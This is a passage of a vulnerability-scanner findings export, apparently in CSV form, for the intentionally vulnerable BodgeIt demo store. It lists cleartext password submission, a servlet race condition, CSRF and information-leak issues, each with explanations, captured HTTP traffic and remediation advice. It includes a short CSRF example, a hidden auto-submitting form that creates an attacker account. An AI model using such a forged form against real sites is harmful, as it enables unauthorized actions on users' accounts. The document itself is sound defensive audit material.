</Paragraph></IfDef> And here is an Android equivalent: <pre> ... PasswordAuthentication pa = authenticator.getPasswordAuthentication(); String userName = pa.getUserName(); String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id, userName}); ... </pre></Content>","","",""
"DemoApps","","Bodgeit","63","Cleartext submission of password","","High","Open","2015-10-15","Burp Suite Pro","319","Cleartext Transmission of Sensitive Information","A6","/bodgeit/login.jsp","","","http://localhost:8080/bodgeit/login.jsp","","GET /bodgeit/login.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/ Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2462 Date: Mon, 28 Mar 2016 20:11:06 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Login</h3> Please enter your credentials: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username:</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password"" name=""password"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Login""></input></td> </tr> </table> </center> </form> If you dont have an account with us then please <a href=""register.jsp"">Register</a> now for a free account. <br/><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","The page contains a form with the following action URL, which is submitted over clear-text HTTP:<ul><li>http://localhost:8080/bodgeit/login.jsp</li></ul>The form contains the following password field:<ul><li>password</li></ul> Issue Background: <p>Some applications transmit passwords over unencrypted connections, making them vulnerable to interception. To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.</p> <p>Vulnerabilities that result in the disclosure of users' passwords can result in compromises that are extremely difficult to investigate due to obscured audit trails. Even if the application itself only handles non-sensitive information, exposing passwords puts users who have re-used their password elsewhere at risk.</p>","<p>Applications should use transport-level encryption (SSL or TLS) to protect all sensitive communications passing between the client and the server. Communications that should be protected include the login mechanism and related functionality, and any functions where sensitive data can be accessed or privileged actions can be performed. These areas should employ their own session handling mechanism, and the session tokens used should never be transmitted over unencrypted communications. If HTTP cookies are used for transmitting session tokens, then the secure flag should be set to prevent transmission over clear-text HTTP.</p>","","",""
"DemoApps","","Bodgeit","47","Cleartext submission of password","","High","Open","2015-10-15","Burp Suite Pro","319","Cleartext Transmission of Sensitive Information","A6","/bodgeit/register.jsp","","","http://localhost:8080/bodgeit/register.jsp","","GET /bodgeit/register.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/login.jsp Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32; b_id=2","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2485 Date: Mon, 28 Mar 2016 20:11:16 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Register</h3> Please enter the following details to register with us: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username (your email address):</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password1"" name=""password1"" type=""password""></input></td> </tr> <tr> <td>Confirm Password:</td> <td><input id=""password2"" name=""password2"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Register""></input></td> </tr> </table> </center> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","The page contains a form with the following action URL, which is submitted over clear-text HTTP:<ul><li>http://localhost:8080/bodgeit/register.jsp</li></ul>The form contains the following password fields:<ul><li>password1</li><li>password2</li></ul> Issue Background: <p>Some applications transmit passwords over unencrypted connections, making them vulnerable to interception. To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.</p> <p>Vulnerabilities that result in the disclosure of users' passwords can result in compromises that are extremely difficult to investigate due to obscured audit trails. Even if the application itself only handles non-sensitive information, exposing passwords puts users who have re-used their password elsewhere at risk.</p>","<p>Applications should use transport-level encryption (SSL or TLS) to protect all sensitive communications passing between the client and the server. Communications that should be protected include the login mechanism and related functionality, and any functions where sensitive data can be accessed or privileged actions can be performed. These areas should employ their own session handling mechanism, and the session tokens used should never be transmitted over unencrypted communications. If HTTP cookies are used for transmitting session tokens, then the secure flag should be set to prevent transmission over clear-text HTTP.</p>","","",""
"DemoApps","","Bodgeit","123","Race Condition: Singleton Member Field","","High","Open","2015-10-15","Fortify SCA","362","Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')","","root/dbconnection.jspf","","","http://localhost/root/dbconnection.jspf","","","","Abstract: <Content><Paragraph>The class <Replace key=""EnclosingClass.name""/> is a singleton, so the member field <Replace key=""$dec.name$""/> is shared between users. The result is that one user could see another user's data.<AltParagraph>Servlet member fields might allow one user to see another user's data.</AltParagraph></Paragraph></Content> Explanation: <Content>Many Servlet developers do not understand that a Servlet is a singleton. There is only one instance of the Servlet, and that single instance is used and re-used to handle multiple requests that are processed simultaneously by different threads. A common result of this misunderstanding is that developers use Servlet member fields in such a way that one user may inadvertently see another user's data. In other words, storing user data in Servlet member fields introduces a data access race condition. <b>Example 1:</b> The following Servlet stores the value of a request parameter in a member field and then later echoes the parameter value to the response output stream. <pre> public class GuestBook extends HttpServlet { String name; protected void doPost (HttpServletRequest req, HttpServletResponse res) { name = req.getParameter(""name""); ... out.println(name + "", thanks for visiting!""); } } </pre> While this code will work perfectly in a single-user environment, if two users access the Servlet at approximately the same time, it is possible for the two request handler threads to interleave in the following way: Thread 1: assign ""<code>Dick</code>"" to <code>name</code> Thread 2: assign ""<code>Jane</code>"" to <code>name</code> Thread 1: print ""<code>Jane, thanks for visiting!</code>"" Thread 2: print ""<code>Jane, thanks for visiting!</code>"" Thereby showing the first user the second user's name.</Content>","Recommendations: <Content>Do not use Servlet member fields for anything but constants. (i.e. make all member fields <code>static final</code>). Developers are often tempted to use Servlet member fields for user data when they need to transport data from one region of code to another. If this is your aim, consider declaring a separate class and using the Servlet only to ""wrap"" this new class. <b>Example 2:</b> The bug in the example above can be corrected in the following way: <pre> public class GuestBook extends HttpServlet { protected void doPost (HttpServletRequest req, HttpServletResponse res) { GBRequestHandler handler = new GBRequestHandler(); handler.handle(req, res); } } public class GBRequestHandler { String name; public void handle(HttpServletRequest req, HttpServletResponse res) { name = req.getParameter(""name""); ... out.println(name + "", thanks for visiting!""); } } </pre> Alternatively, a Servlet can utilize synchronized blocks to access servlet instance variables but using synchronized blocks may cause significant performance problems.</Content>","","",""
"DemoApps","","Bodgeit","13","Cross-Site Request Forgery","","High","Open","2015-10-15","Fortify SCA,WebInspect,Checkmarx","352","Cross-Site Request Forgery (CSRF)","A8","root/login.jsp","","","http://localhost/root/login.jsp","","","","Abstract: <Content><Paragraph>The form post at <Replace key=""PrimaryLocation.file""/> line <Replace key=""PrimaryLocation.line""/> must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.<AltParagraph>Form posts must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.</AltParagraph></Paragraph></Content> Explanation: <Content>A cross-site request forgery (CSRF) vulnerability occurs when: 1. A Web application uses session cookies. 2. The application acts on an HTTP request without verifying that the request was made with the user's consent. <Paragraph> In this case the application generates HTTP request via a form post at <Replace key=""PrimaryLocation.file""/> line <Replace key=""PrimaryLocation.line""/>. </Paragraph> A nonce is a cryptographic random value that is sent with a message to prevent replay attacks. If the request does not contain a nonce that proves its provenance, the code that handles the request is vulnerable to a CSRF attack (unless it does not change the state of the application). This means a Web application that uses session cookies has to take special precautions in order to ensure that an attacker can't trick users into submitting bogus requests. Imagine a Web application that allows administrators to create new accounts by submitting this form: <pre> &lt;form method=""POST"" action=""/new_user"" &gt; Name of new user: &lt;input type=""text"" name=""username""&gt; Password for new user: &lt;input type=""password"" name=""user_passwd""&gt; &lt;input type=""submit"" name=""action"" value=""Create User""&gt; &lt;/form&gt; </pre> An attacker might set up a Web site with the following: <pre> &lt;form method=""POST"" action=""http://www.example.com/new_user""&gt; &lt;input type=""hidden"" name=""username"" value=""hacker""&gt; &lt;input type=""hidden"" name=""user_passwd"" value=""hacked""&gt; &lt;/form&gt; &lt;script&gt; document.usr_form.submit(); &lt;/script&gt; </pre> If an administrator for example.com visits the malicious page while she has an active session on the site, she will unwittingly create an account for the attacker. This is a CSRF attack. It is possible because the application does not have a way to determine the provenance of the request. Any request could be a legitimate action chosen by the user or a faked action set up by an attacker. The attacker does not get to see the Web page that the bogus request generates, so the attack technique is only useful for requests that alter the state of the application. Most Web browsers send an HTTP header named <code>referer</code> along with each request. The <code>referer</code> header is supposed to contain the URL of the referring page, but attackers can forge it, so the referer header is not useful for determining the provenance of a request. Applications that pass the session identifier in the URL rather than as a cookie do not have CSRF problems because there is no way for the attacker to access the session identifier and include it as part of the bogus request. CSRF is entry number five on the 2007 OWASP Top 10 list.</Content>","Recommendations: <Content>Applications that use session cookies must include some piece of information in every form post that the back-end code can use to validate the provenance of the request. One way to do that is to include a random request identifier or nonce, like this: <pre> RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, ""/new_user""); body = addToPost(body, new_username); body = addToPost(body, new_passwd); body = addToPost(body, request_id); rb.sendRequest(body, new NewAccountCallback(callback)); </pre> Then the back-end logic can validate the request identifier before processing the rest of the form data. When possible, the request identifier should be unique to each server request rather than shared across every request for a particular session. As with session identifiers, the harder it is for an attacker to guess the request identifier, the harder it is to conduct a successful CSRF attack. The token should not be easily guessed and it should be protected in the same way that session tokens are protected, such as using SSLv3. Additional mitigation techniques include: <b>Framework protection:</b> Most modern web application frameworks embed CSRF protection and they will automatically include and verify CSRF tokens. <b>Use a Challenge-Response control:</b> Forcing the customer to respond to a challenge sent by the server is a strong defense against CSRF. Some of the challenges that can be used for this purpose are: CAPTCHAs, password re-authentication and one-time tokens. <b>Check HTTP Referer/Origin headers:</b> An attacked won't be able to spoof these headers while performing a CSRF attack. This makes these headers a useful method to prevent CSRF attacks. <b>Double-submit Session Cookie:</b> Sending the session ID Cookie as a hidden form value in addition to the actual session ID Cookie is a good protection against CSRF attacks. The server will check both values and make sure they are identical before processing the rest of the form data. If an attacker submits a form in behalf of a user, he won't be able to modify the session ID cookie value as per the same-origin-policy. <b>Limit Session Lifetime:</b> When accessing protected resources using a CSRF attack, the attack will only be valid as long as the session ID sent as part of the attack is still valid on the server. Limiting the Session lifetime will reduce the probability of a successful attack. The techniques described here can be defeated with XSS attacks. Effective CSRF mitigation includes XSS mitigation techniques. </Content> Tips: 1.SCA flags all HTML forms and XMLHttpRequest objects that might perform a POST operation. The auditor must determine if each form could be valuable to an attacker as a CSRF target and whether or not an appropriate mitigation technique is in place.","","",""
"DemoApps","","Bodgeit","113","System Information Leak: External","","High","Open","2015-10-15","Fortify SCA","497","Exposure of System Data to an Unauthorized Control Sphere","","root/admin.jsp","","","http://localhost/root/admin.jsp","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection. External leaks can help an attacker by revealing specific data about operating systems, full pathnames, the existence of usernames, or locations of configuration files, and are more serious than internal information leaks which are more difficult for an attacker to access. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code leaks Exception information in the HTTP response: <pre> protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException { ... PrintWriter out = res.getWriter(); try { ... } catch (Exception e) { out.println(e.getMessage()); } } </pre> This information can be exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. In the mobile world, information leaks are also a concern. The essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which is why application authors need to be careful about what information they include in messages addressed to other applications running on the device. <b>Example 2:</b> The code below broadcasts the stack trace of a caught exception to all the registered Android receivers. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); view.getContext().sendBroadcast(i); } ... </pre> Here is another scenario specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication. <b>Example 3:</b> The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range. <pre> ... public static final String TAG = ""NfcActivity""; private static final String DATA_SPLITTER = ""__:DATA:__""; private static final String MIME_TYPE = ""application/my.applications.mimetype""; ... TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE); String VERSION = tm.getDeviceSoftwareVersion(); ... NfcAdapter nfcAdapter = NfcAdapter.getDefaultAdapter(this); if (nfcAdapter == null) return; String text = TAG + DATA_SPLITTER + VERSION; NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA, MIME_TYPE.getBytes(), new byte[0], text.getBytes()); NdefRecord[] records = { record }; NdefMessage msg = new NdefMessage(records); nfcAdapter.setNdefPushMessage(msg, this); ... </pre> NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper.</Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system. Due to this, it's advised to always keep information instead of sending it to a resource directly outside the program. <b>Example 4:</b> The code below broadcasts the stack trace of a caught exception within your app only, so that it cannot be leaked to other apps on the system. There is also the added bonus that this is more efficient than globally broadcasting through the system. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); LocalBroadcastManager.getInstance(view.getContext()).sendBroadcast(i); } ... </pre> If you are concerned about leaking system data via NFC on an Android device, you could do one of the following three things. Either do not include system data in the messages pushed to other devices in range, or encrypt the payload of the message, or establish secure communication channel at a higher layer.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category.","","",""
"DemoApps","","Bodgeit","124","System Information Leak: External","","High","Open","2015-10-15","Fortify SCA","497","Exposure of System Data to an Unauthorized Control Sphere","","root/basket.jsp","","","http://localhost/root/basket.jsp","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection. External leaks can help an attacker by revealing specific data about operating systems, full pathnames, the existence of usernames, or locations of configuration files, and are more serious than internal information leaks which are more difficult for an attacker to access. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code leaks Exception information in the HTTP response: <pre> protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException { ... PrintWriter out = res.getWriter(); try { ... } catch (Exception e) { out.println(e.getMessage()); } } </pre> This information can be exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. In the mobile world, information leaks are also a concern. The essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which is why application authors need to be careful about what information they include in messages addressed to other applications running on the device. <b>Example 2:</b> The code below broadcasts the stack trace of a caught exception to all the registered Android receivers. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); view.getContext().sendBroadcast(i); } ... </pre> Here is another scenario specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication. <b>Example 3:</b> The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range. <pre> ... public static final String TAG = ""NfcActivity""; private static final String DATA_SPLITTER = ""__:DATA:__""; private static final String MIME_TYPE = ""application/my.applications.mimetype""; ... TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE); String VERSION = tm.getDeviceSoftwareVersion(); ... NfcAdapter nfcAdapter = NfcAdapter.getDefaultAdapter(this); if (nfcAdapter == null) return; String text = TAG + DATA_SPLITTER + VERSION; NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA, MIME_TYPE.getBytes(), new byte[0], text.getBytes()); NdefRecord[] records = { record }; NdefMessage msg = new NdefMessage(records); nfcAdapter.setNdefPushMessage(msg, this); ... </pre> NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper.</Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system. Due to this, it's advised to always keep information instead of sending it to a resource directly outside the program. <b>Example 4:</b> The code below broadcasts the stack trace of a caught exception within your app only, so that it cannot be leaked to other apps on the system. There is also the added bonus that this is more efficient than globally broadcasting through the system. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); LocalBroadcastManager.getInstance(view.getContext()).sendBroadcast(i); } ... </pre> If you are concerned about leaking system data via NFC on an Android device, you could do one of the following three things. Either do not include system data in the messages pushed to other devices in range, or encrypt the payload of the message, or establish secure communication channel at a higher layer.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category.","","",""
"DemoApps","","Bodgeit","125","System Information Leak: External","","High","Open","2015-10-15","Fortify SCA","497","Exposure of System Data to an Unauthorized Control Sphere","","root/basket.jsp","","","http://localhost/root/basket.jsp","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection. External leaks can help an attacker by revealing specific data about operating systems, full pathnames, the existence of usernames, or locations of configuration files, and are more serious than internal information leaks which are more difficult for an attacker to access. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code leaks Exception information in the HTTP response: <pre> protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException { ... PrintWriter out = res.getWriter(); try { ... } catch (Exception e) { out.println(e.getMessage()); } } </pre> This information can be exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. In the mobile world, information leaks are also a concern. The essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which is why application authors need to be careful about what information they include in messages addressed to other applications running on the device. <b>Example 2:</b> The code below broadcasts the stack trace of a caught exception to all the registered Android receivers. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); view.getContext().sendBroadcast(i); } ... </pre> Here is another scenario specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication. <b>Example 3:</b> The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range. <pre> ... public static final String TAG = ""NfcActivity""; private static final String DATA_SPLITTER = ""__:DATA:__""; private static final String MIME_TYPE = ""application/my.applications.mimetype""; ... TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE); String VERSION = tm.getDeviceSoftwareVersion(); ... NfcAdapter nfcAdapter = NfcAdapter.getDefaultAdapter(this); if (nfcAdapter == null) return; String text = TAG + DATA_SPLITTER + VERSION; NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA, MIME_TYPE.getBytes(), new byte[0], text.getBytes()); NdefRecord[] records = { record }; NdefMessage msg = new NdefMessage(records); nfcAdapter.setNdefPushMessage(msg, this); ... </pre> NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper.</Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system. Due to this, it's advised to always keep information instead of sending it to a resource directly outside the program. <b>Example 4:</b> The code below broadcasts the stack trace of a caught exception within your app only, so that it cannot be leaked to other apps on the system. There is also the added bonus that this is more efficient than globally broadcasting through the system. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); LocalBroadcastManager.getInstance(view.getContext()).sendBroadcast(i); } ... </pre> If you are concerned about leaking system data via NFC on an Android device, you could do one of the following three things. Either do not include system data in the messages pushed to other devices in range, or encrypt the payload of the message, or establish secure communication channel at a higher layer.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category.","","",""
